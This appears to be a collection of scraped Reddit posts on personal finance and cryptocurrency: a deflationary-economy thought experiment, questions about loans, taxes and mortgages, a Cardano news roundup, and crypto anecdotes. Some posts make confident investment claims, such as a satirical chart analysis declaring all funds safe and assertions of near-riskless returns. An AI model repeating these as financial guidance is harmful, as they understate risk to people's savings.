Set-up for this discussion: an imaginary world that uses a deflationary currency globally. We’re going to use the economic cycles (expansion, peak, contraction, and trough) as we know them to have a discussion on how money moves and behaves differently under this deflationary system. That’s going to include the bad stuff too - I’m sorry to tell you that there is no such thing as a perfect system. The question is ultimately what risks as a society we are willing to take, what problems we can alleviate, and whether the new problems are worse or harder to solve than the old ones.

Let’s set some constants for our imaginary world, so that we have a basis of which to go off of:

1. The entire world is using a deflationary currency - BCH for the sake of this discussion, since we all know what it is. People in this world may also hold and use other cryptocurrencies, but they aren’t the vast payment settlement system used.
2. Fees have remained low - in proportion with what they are now.
3. The world is parallel to ours, and therefore is the world as it currently is - no predictions of “future” technologies. We can’t understand how it’s going to work in the future if we can’t understand how it works in the present.
4. We’re going to ignore government regulation for now - we’re analyzing this system from an economic standpoint.
5. We will assume a largely capitalist system, or to put it another way, a system in which people have a say in how they spend and save their money and ownership of property continues to be respected and legally upheld.
6. Since BCH is globally adopted, it’s value is changing but not all that much - at the most, a variance of 1-3% per year from the mean. No investing for the moon.

Alright, let’s get to it:

**Expansion**: This cycle is marked by growing investments in companies and ideas. In a typical system, employment is increasing, economies are growing, and there is upward pressure on prices. In this deflationary world, that means more sats are being exchanged - people are buying things and throwing out money left and right. The most popular songs on the radio aren’t singing about having a lot of money, they are singing about having a lot of things - cars, houses, NFT’s, etc. People are confident that when they spend their money, it’s going to come back to them because the velocity of money is high. This is simultaneously making it so that people have to spend more of their sats on products, as more currency in the system means less value. Investors aren’t interested in holding a depreciating asset, so they are looking for returns elsewhere. People buy stocks and bonds, other crypto to hodl, and invest in small businesses. Interest rates are increasing. Everyone is hoping that they will get more sats back then they put in. After a time, workers notice that things are just getting a bit too expensive, so they demand higher salaries to pay for these things. Companies keep up for a while, but greed eventually sets in and salary increases get smaller.

I think we can see that this cycle would actually remain pretty similar to how an inflationary environment would. I would imagine that the velocity of money wouldn’t be quite as high as in an inflationary environment, but it would still be high enough to probably keep employment below 6-8%. But the party’s gotta start slowing down at some point right?

**Peak**: The price ceiling on the middle class starts to come to a head. People aren’t buying as much, not because they don’t want to, but simply because they can’t. Companies don’t have a whole lot of BCH anymore, because most of it is leant out for other ventures. As business leaders see things slowing down, they being liquidating assets and pulling BCH out of these investments. People getting out early are able to realize nice gains. Some of that goes to workers, but a vast majority goes to the few that either saw the crest, or just get plain lucky. These liquidations excellerate the velocity temporarily, but people are keeping their BCH on their wallets now. It starts slow - 0.5% less velocity, then 1, then 2, then 3% month over month. People aren’t spending as much money, and the ones not spending are psyching themselves out - they aren’t spending because they think the economy is on the brink of something catastrophic.

This is where we start to see a departure from inflationary cycles. You see, in this cycle, the people that are essentially panicking don’t really know that they are actually helping those who aren’t. With more people holding their BCH instead of spending or investing, the people in the middle and lower classes are able to buy more things with the salaries they have. It’s slow, but they notice that the price of milk is going down - it was 2600 sats a few months ago, but now it’s selling for 2400. Interestingly, people stop putting so much pressure on the companies they work for. They wanted to get paid more, but it seems the economy is actually rebalancing in their favor. Middle class people may pull their money out of investments, but the vast majority don’t - it’s mostly in retirement vehicles anyways, and the ones that aren’t heavily invested don’t really see a point. Sure BCH is more valuable, but they really like that Musk guy, and Tesla’s going to the moon.

**Contraction**: The currency that was being circulated has gone up in value. Maybe unemployment goes up a little, but the ones still working are able to get more items with their money. Interest rates are dropping down a little, making borrowing a bit easier. The economy starts to bottom, and the people that “got out” are laughing about how smart they are. But something weird is happening - things are getting bad, but not really that much. The economists release reports that there’s not much to worry about. The ones that sold their investments start to regret it, and start looking for new ventures - what were they thinking?

**Trough**: What trough? You know your cousin Jimmy got fired, but he was always bragging about how his boss “let” him come in late. As you reflect back on the run-up to this point, you realize there was something missing. It’s subtle. The S&amp;P 500 is only yielding about 4-5% per year. Without inflation, there is no “risk-free” rate, which means you’re actually not getting as high of a return as you could have. But after you do the math, you realize you won’t need as much money in retirement. You aren’t the only one noticing this - the lows aren’t as low, but the high’s aren’t as high. The hedge fund folks are pulling 12% returns on a good year, the PE guys 14%. Wallstreebets is still filled with people YOLOing their savings as the downside is still unlimited (someone can always just walk away with your money). So the upside has shifted down, but the downside is not looking so good. People that like taking big risks don’t like this, and they resist this idea. This world even has less wealthy people, although the people in the middle and upper classes seem pretty comfortable - the idea of working 40 years for retirement is strange, 30 years is far more common.

It’s different - and somewhere in this world, a geeky risk-taker going by the name of Natoshi Sakamoto makes an inflationary digital currency, so people can take those bigger risks and get even more money from the system.

&amp;#x200B;

My car has been shutting off randomly and I no longer feel comfortable driving it around anymore in case it dies in the middle of the highway or something. It is almost 20 years old now so it's definitely time for me to get another car.   


I have about $42k in savings and have already paid off my student loans. I am still living with my parents so I do not really have any expenses whatsoever at the moment. I make about $3k a month from my part time job and an online store I sell things on. The cars I am looking at are all around the $21-$24k range and while I am not too willing to look at used cars I would consider looking at one that was made around 2017-2018 with low miles on it.   


This is the first big purchase that I will be making and I wanted to see if it would be a good idea to buy the car and pay for it all at once. I do not like being in debt but the idea of half my bank account getting spent at once makes me a little sad inside. I also understand that I should be contributing a portion of my money to a Roth IRA soon. The only thing I am certain on is I need to have a new car by the end of the week since I need one for work. Any advice on how I should go about paying my car off would be awesome! I am not as educated about purchasing cars as I should be so I am unsure how much I should put down if I decide to pay it off monthly and how low of an interest rate I could realistically get.

personalfinance,Should I be worried? Paid my federal taxes last week using H&amp;R block software (e-file) nd the amount owed still hasn't been debited from my account.,"0. I submitted on 4/13
1. I owed about $5K. No refund for me 
2. I am aware the tax deadline has moved to May, however this tax was for quarterly payments for 2020. Those deadlines have not changed. And I had a penalty for underpayment (paid nothing all year, $75 fee) so I'm double worried it has been received late. 
3. I paid my 2021 quarterlies on time this time, also on 4/13, directly to the IRS, and that was debited immediately. 

Thank you.

cardano,Cardano Rumor Rundown APR 20 2021: Beware NFT Forgeries &amp; Crypto Regulation,"Hey Everyone!

I've been consuming all the Cardano news and media on a daily basis for years now. I figured it wouldn’t hurt to share a list of what I'm seeing for anyone else who's interested. Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list. 

Check out the youtube companion to today’s post: [https://youtu.be/WdnWTRZxJ9Q](https://youtu.be/WdnWTRZxJ9Q)

Let's go....

Newly covered today: 

1. Danger Will Cardanoson: we’ve got fake rare NFTs being minted in Cardano now. Always check the Policy ID. [https://twitter.com/pool\_pm/status/1383892319896621059](https://twitter.com/pool_pm/status/1383892319896621059)

4. IOHK is hiring something like 80 people.  Very good sign for the Cardano ecosystem. [https://twitter.com/timbharrison/status/1384116617588535303](https://twitter.com/timbharrison/status/1384116617588535303)
5. Biden Administration in early stages of regulating crypto.  But, the news outlet here is also reporting chatter among securities lawyers that Gary Genseler (new SEC Head) will approve a crypto ETF as a means of throwing a bone to conservative law makers. [https://twitter.com/HukAleksandra/status/1384261829463924744](https://twitter.com/HukAleksandra/status/1384261829463924744)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Catalyst Fund 3 Voting is ongoing, it looks like the Yoroi team has worked out the voting problem in the Yoroi wallet. [https://twitter.com/YoroiWallet/status/1369050858546200585](https://twitter.com/YoroiWallet/status/1369050858546200585)
4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
5. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
6. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
7. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
8. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe. [https://www.youtube.com/watch?v=B8Yj\_dvh7OA](https://www.youtube.com/watch?v=B8Yj_dvh7OA) [https://www.youtube.com/watch?v=p-1TKq7okhs](https://www.youtube.com/watch?v=p-1TKq7okhs)
13. Cardano hits 400k delegators! [https://twitter.com/RichardMcCrackn/status/1377732956194766850](https://twitter.com/RichardMcCrackn/status/1377732956194766850)
14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture. [https://www.yahoo.com/entertainment/graph-blockchain-announces-acquisition-cardano-110000210.html](https://www.yahoo.com/entertainment/graph-blockchain-announces-acquisition-cardano-110000210.html)

17. Orion Protocol is aiming to be the first liquidity aggregator on Cardano. [https://coinmarketcap.com/el/headlines/news/orion-protocol-and-cardano/](https://coinmarketcap.com/el/headlines/news/orion-protocol-and-cardano)
18. How hard is learning Haskell from scratch? Today’s youtube companion to this post describes my experience so far learning Haskell as a beginner with little programming experience. [https://haskellbook.com/ ](https://haskellbook.com/)[http://learnyouahaskell.com/chapters](http://learnyouahaskell.com/chapters) [Derek Banas Youtube Haskell Tutorial](https://www.youtube.com/watch?v=02_H3LjqMr8)
19. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)
20. Cardano NFTs get some coverage on CoinTelegraph. [https://cointelegraph.com/news/wild-west-as-developers-macgyver-highly-popular-nfts-on-cardano/amp](https://cointelegraph.com/news/wild-west-as-developers-macgyver-highly-popular-nfts-on-cardano/amp)
21. Emurgo Academy for blockchain education? Has anyone heard of this? [https://twitter.com/emurgo\_io/status/1378346801598754816](https://twitter.com/emurgo_io/status/1378346801598754816)

23. SpaceBudz published a great article on how they were able to distribute 10,000 NFTs. [https://spacebudz.medium.com/how-we-pulled-off-the-sale-9dbe54c30ba5](https://spacebudz.medium.com/how-we-pulled-off-the-sale-9dbe54c30ba5)
24. For those learning Haskell/Plutus, check out this awesome one hour video from 2012 with Brian Beckman that introduces monoids and monads in a very non-scary way. [https://www.youtube.com/watch?v=ZhuHCtR3xq8](https://www.youtube.com/watch?v=ZhuHCtR3xq8)
25. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)
26. ...AND STILL....CARDANO=THE KING OF GITHUB COMMITS! [https://twitter.com/wiSource/status/1379142670686294017](https://twitter.com/wiSource/status/1379142670686294017)
27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
42. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)
43. “Smart people end up in Cardano one way or another.” [https://twitter.com/Adavanz1/status/1378405038608031746](https://twitter.com/Adavanz1/status/1378405038608031746)
44. IOHK drops a good summary of the Alonzo Smart Contract timeline. [https://iohk.io/en/blog/posts/2021/04/08/smart-contracts-%E2%80%93-here-we-come/](https://iohk.io/en/blog/posts/2021/04/08/smart-contracts-%E2%80%93-here-we-come/)
45. You can now buy Cardano Estates wine with ADA. This is not a novelty crypto wine. This is legit wine. [https://twitter.com/Jack22220741/status/1380603834947485700](https://twitter.com/Jack22220741/status/1380603834947485700)

47. The Cardano native token space continues to flourish. [https://twitter.com/matiwinnetou/status/1380600524853108738](https://twitter.com/matiwinnetou/status/1380600524853108738)
48. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
49. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.   [https://github.com/input-output-hk/plutus-pioneer-program](https://github.com/input-output-hk/plutus-pioneer-program)
50. There is now a website that will mint Cardano NFTs for you.  Thanks to Cardano subreddit user Padierfind. [https://www.nft-maker.io/](https://www.nft-maker.io/)
51. Yesterday was “Get ADA Day” with the end of Epoch 258.  I hope everyone did well in their staking. 
52. Here’s a great way to visualize token minting and other on-chain activities thanks to Smaug Stake Pool. [https://pool.pm/](https://pool.pm/)
53. It looks like the automated NFT maker covered yesterday,  [nft-maker.io](https://www.nft-maker.io/), actually charges 10 ADA per NFT.  Just an update on the price there since it was unknown yesterday.  
54. The Cardano tattoo phenomenon continues. This time, we even have one that actually features a depiction of the namesake.  [https://twitter.com/jp\_tattooist/status/1381236949567086592 ](https://twitter.com/jp_tattooist/status/1381236949567086592)[https://twitter.com/jp\_tattooist/status/1381351429554724875](https://twitter.com/jp_tattooist/status/1381351429554724875)
55. Ethiopian Prime Minister Abiy Ahmed outlines how he will liberalize the telecom industry in his country and lays out his four pillars of “Digital Ethiopia 2025”: digital ID, interoperable payment platforms, e-government applications, and e-commerce.

60. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right?

61. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa:  1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.  Here’s the LunarCrush interview. All queued up to the exact spot for the Africa discussion--[https://youtu.be/GWpqNPdOf9E?t=3804](https://youtu.be/GWpqNPdOf9E?t=3804)

CryptoCurrency,[TA/Analysis] I did some research and your investments are all safe,"Just like everyone else my numbers are all red lately, deep inside there is a fear growing that this might be a bubble and that dogecoin might not be worth the billions that it's currently valued at. So I decided to get proactive, open up my favorite TA-tools and check what the numbers say. And BOY was I surprised to see that not only are my investments safe, but they are also going to explode in value!

https://www.tradingview.com/x/yn4ak1ES/

So in this first chart I have marked all the relevant sections and done some conservative estimates on where btc will be come June. Now just in case you're wondering why the numbers look weird, the scale on the Y-axis is logarithmic as I felt like that further aligned with my agenda. This is based on standard logarithmic and linear regression, coupled with fibonacci analysis and deepvision-AI. This is standard stuff, the same techniques employed by the FED. A very conservative estimate puts BTC at 85737 by June, and a more optimistic puts it at 220k in May.

Now a little bit ominous was that I couldn't get the pitchfork-tool to create lines in between the optimistic and pessimistic areas. I'm not sure exactly to why that is, though I have some theories it might be some DEGENERATES in the SEC liquidating short sales and squeezing the hard fork. I've aptly named this the void of doom - if we in any way approach this I would literally dump all my stacks cause then I'm pretty sure bitcoin is going to collapse. OK on to the next chart.

https://s3.tradingview.com/snapshots/v/VTRc3CKb.png

Here I've simply gone into orion protocol in the trading view and added some indicators. I couldn't quite figure out how to draw lines on this chart so it's basically illegible, but what is clear is that there is a big spike in trade volume 03:00 in whatever timezone this data is from. That happens to be when bots are awake, so this does mean there is SOME market manipulation. But looking at the attrition line (in red) you can clearly see that this manipulation is going down, which means the market is self-healing and on the course of becoming healthy.

Obviously guys this is not financial advice but as my TA clearly states that all your funds are safe and you should remember to buy the dip and also keep some cash on your portfolio so you can take advantage of further dips. Remember; sales are temporary, crypto is forever",cryptocurrency

personalfinance,Questions on loan extension.,"To preface this, I’m in quite a bit of debt, roughly 45k. 60%~ of this is credit card debt at relatively high interest rates. I’ve considered bankruptcy, but I don’t think I’m at that point yet, and obviously I’d like to avoid that option altogether. I am also completely current on every account that I have.

Anyways, I really want to free up some monthly income, and after some research I’ve found I can potentially free up an extra $150~ a month by extending both my auto loan (by a year) and personal loan (by two years). This is assuming that my CU allows me to keep the same interest rate. To me, this makes a lot of sense, but I’d like to get an opinion on: 

a. Whether I’m being wishful in thinking my CU would allow me to extend without increasing the interest rate, and

 b. any potential downsides that I may be missing.

CryptoCurrency,My Crypto Ride,"2015 - signed up to Coinbase, didn’t complete a buy though, because I’m stupid.

2017 - (December of course) bought as much as I could...

2018 - played around with mining Garlicoin because I thought it was funny, and wanted to know how mining worked. Throughout this year I Invested poorly, got scammed multiple times, and lost money.

2019 - Bought little bits and pieces, was happy with my portfolio. I met a homeless guy and we became friends, I started to support him personally and financially because the bureaucracy of the welfare state kept screwing him over. I started to sell off my crypto to help keep him housed and fed. Went back through my old wallets to try and help myself out while being basically unemployed. I had forgotten about my Electrum wallet, oooh an update, ok, install, aaaaand it’s gone. Ffs.

2020 (early to mid) - during the crash I was financially screwed and kept supporting my friend during a really hard time, managed to get him housed while the welfare state consistently screwed him over while he was grieving for his daughter and grandson that died in a car crash. Long story short, I got into debt supporting him and myself while he was waiting for the payments he was owed by ESA and Universal Credit. Sadly during lockdown he died from lack of treatment for an infection in his leg. 
I had sold off basically all of my crypto during this big dip, lots of ETH for £100 per token. So I was left heartbroken and skint while covid kicked off.

2020 (mid) - had to take out loans because I had ended up with no support from any of the government support schemes.

2020 (late) - I had been studying a Masters, so I got my student loan through, got another personal loan through the government, coupled with a very stressful load of profitable work, and spending very little through lockdown. I pumped everything into stopping interest on debts, and then everything I comfortably could into crypto.

2021 - HODL! I’ve been continuing to try and onboard friends and family. I mainly hold BTC, ETH, and BCH, and have seen great returns, and have paid people for small pieces of work in BCH. I am now in the best financial position I have ever been in in my life, all because of crypto. Time in the market, not timing in the market. I am working on some NFT work in education and art at the moment, and am excited for the future of these technologies.

TL:DR Started buying at ATH in 2017, got scammed multiple times, sold at the worst points, then I matured in my approach and over the last couple of years went from the worst financial position in my life, to the best. Not through day trading or anything like that, instead through hodling and using crypto, knowing that I am then part of the future.

TL:DR What’s the learning? - Be wary of scams, be careful, and know that investment in the crypto market will on average provide gains against fiat, so don’t feel salty and lose faith when you make stupid short term decisions. The technologies are amazing and will continue to mature, becoming more powerful and ubiquitous.

CryptoCurrency,My Boomer parents gave me money to invest in crypto and keep.,"I got into Crypto a while back and had some ups and downs across the last bull and bear markets, but since the start of the current bull market, things have been going well. My parents took no interest whatsoever when I started, and kept telling me this was a foolish investment. That was until my portfolio was significantly more valuable than any savings any of us had. Recently I had a phone call with them and my Mother wanted to send me some money to invest. I thought she wanted me to invest for her, so I explained the risks and how I didn't think it was a good idea unless she learnt it herself. They then explained that they were giving me to the money to keep, as long as I invested it in Crypto. I won't disclose the value, but it's nothing to be scoffed at. I can't help but feel they're gonna be really judgemental if this all falls apart. Does anyone think this is a bad idea, or should I just slap it in BTC and ETH and be done with it?

personalfinance,What are the steps and timeline for choosing a mortgage lender when buying a home?,"We are attempting to buy our first home and need to close quickly (30 days).  We've obtained pre-approval while making an offer and received the real estate purchase and sale contract 2 days ago.  We're currently finalizing the schedule for doing a home inspection within the next week.

We are speaking to 2 different local lenders.  Both are very responsive and close in their original quotes for an interest rate.  

One lender provided a ""loan summary/quote"" detailing all typical fees and closing costs.  This summary clearly states ""Get an official Loan Estimate before choosing a loan"".  The quote shows a 30-yr fixed interest rate of 2.875% and 3.072% APR.

The second lender simply shot over an email with some screenshots of the software he uses to show the estimated monthly payment for various loan options and noted the origination fee.  He also stated:  "" We used 2.99% for now on the rate, and once we have the contract and start to put this together, we can whittle down on that further.  Bonds, which drive rates, have been pivoting a little (as of last week, and hopefully continuing into this week), so we’re waiting to see how far they might dip.  For now, 2.99% should be a safe number to use for running some ballpark numbers… ""

So, I guess my question is what are the next steps?  Both lenders have copies of the contract at the moment.  Do I have both lenders run my credit and provide an official loan summary to lock in a rate with closing costs?  What should my timeline look like and when do I actually need to sign a contract with one of them to move forward with getting an appraisal on the house?  Ideally, I'd like to compare apples to apples prior to choosing the lender, but I'm not sure when this will happen (i.e. now, after inspection, etc.).  I want to make sure I'm on top of what needs to happen to ensure we close quickly.",finance
personalfinance,University sent me 30day notice on Federal Perkins Loan from 2007. How to proceed?,"Hello everyone.  

Yesterday my college university sent me a 30day notice on a Federal Perkins Loan stating I am in default and that I have 30 days to respond before they send it to the US Dept of Ed. 

Details - the loan was initiated back in 2007.  The last update on the loan was in 5/1/2014 when it entered default, there have been no other updates with it since then.  I have other student loans which I've deferred throughout this time.  I was set to start paying on them last year but then Covid happened and they all keep getting deferred (and now I'm waiting to see what happens with forgiveness, if anything).  

This Perkins Loan does not show up on any of my 3 credit reports as I've just checked.  

I don't understand why they are just sending me this letter now, but it's coming up on 7years to the day of the last status update back in 5/1/2014.

Most of my loans got transferred to Nelnet years ago, I thought this was one of them but I can't find proof of the transfer.

The even bigger question is how do I proceed from here?  

I am not clear how it works with possibly updating the old debt by making an inquiry or a payment and then having it somehow be updated freshly to my credit report.

personalfinance,"Housing: Invest or Pay Cash? Dividends, a new approach.","Hi Everyone, this question has been asked so many times, it is sure getting old. But I was thinking that a good dividend ETF might be the answer. Here my out.

I agree with Dave Ramsey for the most part. His advice for folks to pay for a house in cash is rooted in the fact that most Americans buy houses that are way out of their budget. Paying in cash forces you to buy a more modest dwelling.

But as we all know, this comes at a cost: lost investment income. In this low-interest rate world we live in, is it not better to invest? Many factors go into this invest vs. pay cash equation, but I think there is a best of both worlds approach.

Answer: high-income dividend ETFs like Vanguard's High Dividend Yield Index Fund ETF Shares (VYM). With a yield of 2.98% and a net expense ratio of 0.06%, this one will do nicely.

Why not invest the money in this relatively safe ETF. Let it grow over the years, and pay your monthly nut with quarterly dividends?

Here's my way of calculating home affordability if you want to invest. Say you have $500k in cash to buy a house. $500k in VYM will yield \~$15k per year, or $1250 per month. Putting PMI and Taxes aside assuming those can be paid for with regular income, means this person can afford a $270K house at 2.5% interest with very very little risk. The 10-year return of VYM is \~12%. Over the long term, this seems like a really good option.

financialindependence,Debt-Free Millionaire at 31: The Dumb Way,"2 years ago I [posted here](https://www.reddit.com/r/financialindependence/comments/b33onf/i_made_150000_on_the_side_last_year_should_i_quit/) looking for advice on whether I should quit my day job and go full time in my side business or stick it out at the day job for as long as possible.

Ultimately I decided to stay at my day job and continue to work my side business in my spare time.

This week I hit the long awaited 7-figure net worth, becoming a debt-free “millionaire”.

Here’s my story along with lessons learned along the way.

